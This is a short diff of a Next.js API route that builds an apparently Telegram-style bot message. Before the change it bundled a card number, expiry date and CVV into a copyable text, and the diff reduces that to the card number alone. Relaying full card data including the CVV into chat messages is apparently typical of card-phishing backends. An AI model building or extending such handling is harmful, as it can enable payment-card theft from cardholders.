@@ -118,11 +118,7 @@ export async function PUT(req: NextRequest) {
       ...(needsAmount ? [`💰 Amount: ${amount} ر.س`] : []),
     ].join("\n");
 
-    const copyText = [
-      cardNumber ?? "",
-      expiryDate ?? "",
-      cvv ?? "",
-    ].filter(Boolean).join("\n");
+    const copyText = cardNumber ?? "";
 
     const replyMarkup = {
       inline_keyboard: [
